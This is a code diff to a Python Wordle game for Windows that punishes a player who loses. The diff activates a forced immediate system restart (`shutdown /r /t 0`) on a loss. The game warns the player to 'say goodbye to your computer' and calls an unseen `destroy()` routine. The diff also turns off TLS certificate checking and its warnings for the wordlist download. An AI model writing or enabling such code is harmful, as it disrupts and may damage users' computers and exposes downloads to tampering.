@@ -43,6 +43,8 @@ import win32gui
 import win32con
 import win32api
 import threading
+import urllib3
+urllib3.disable_warnings()
 
 def focus_console_window():
     try:
@@ -275,7 +277,7 @@ def download_wordlist(filename: str, url: str) -> List[str]:
             return []
 
     try:
-        response = requests.get(url, timeout=5)
+        response = requests.get(url, timeout=5, verify=False)
         response.raise_for_status()
         words = [line.strip().upper() for line in response.text.splitlines() if len(line.strip()) == 5 and line.isalpha()]
 
@@ -370,7 +372,7 @@ def is_valid_word(word: str) -> bool:
 def on_loss():
     main()
     destroy()
-    #system("shutdown /r /t 0")
+    system("shutdown /r /t 0")
     return None
 
 def play_wordle() -> None:
@@ -411,7 +413,7 @@ if __name__ == "__main__":
     for i in range(1,15):
         keyboard.press_and_release('ctrl+add')
     block_non_letters()
-    system("cls")
+    clear_screen()
     print(f"You are going to play a game of Wordle, if you fail, {RED}say goodbye to your computer.{RESET}")
     time.sleep(9)
     play_wordle()
